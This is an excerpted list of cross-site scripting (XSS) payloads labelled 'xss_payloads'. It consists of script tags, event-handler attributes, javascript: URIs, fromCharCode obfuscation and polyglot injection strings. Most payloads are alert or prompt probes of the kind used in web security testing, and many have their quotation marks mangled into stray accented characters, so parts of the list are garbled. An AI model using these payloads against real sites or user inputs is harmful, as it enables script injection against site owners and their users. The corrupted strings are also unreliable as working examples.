...
### xss_payloads
```
%3cIMG%20SRC%3d%23%20onmouseover%3d%22alert('xxs')%22%3e - <IMG SRC=# onmouseover="alert('xxs')">
<script>alert(123);</script>
<ScRipT>alert("XSS");</ScRipT>
<script>alert(123)</script>
<script>alert("hellox worldss");</script>
<script>alert(ìXSSî)</script> 
<script>alert(ìXSSî);</script>
<script>alert(ëXSSí)</script>
ì><script>alert(ìXSSî)</script>
<script>alert(/XSSî)</script>
<script>alert(/XSS/)</script>
...
<IMG SRC=îjavascript:alert(ëXSSí);î>
...
ë;alert(String.fromCharCode(88,83,83))//í;alert(String.fromCharCode(88,83,83))//î;alert(String.fromCharCode(88,83,83))//î;alert(String.fromCharCode(88,83,83))//ñ></SCRIPT>î>í><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
<IMG ìîî><SCRIPT>alert(ìXSSî)</SCRIPT>î>
<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
<IMG SRC=îjav ascript:alert(ëXSSí);î>
<IMG SRC=îjav&#x09;ascript:alert(ëXSSí);î>
<<SCRIPT>alert(ìXSSî);//<</SCRIPT>
...
<BODY BACKGROUND=îjavascript:alert(ëXSSí)î>
<BODY ONLOAD=alert(ëXSSí)>
<INPUT TYPE=îIMAGEî SRC=îjavascript:alert(ëXSSí);î>
<IMG SRC=îjavascript:alert(ëXSSí)î
...
" onclick=alert(1)//<button ë onclick=alert(1)//> */ alert(1)//
...
';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
ì onclick=alert(1)//<button ë onclick=alert(1)//> */ alert(1)//
'">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\></|\><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->"></script><script>alert(1)</script>"><img/id="confirm&lpar;1)"/alt="/"src="/"onerror=eval(id&%23x29;>'"><img src="http://i.imgur.com/P8mL8.jpg">
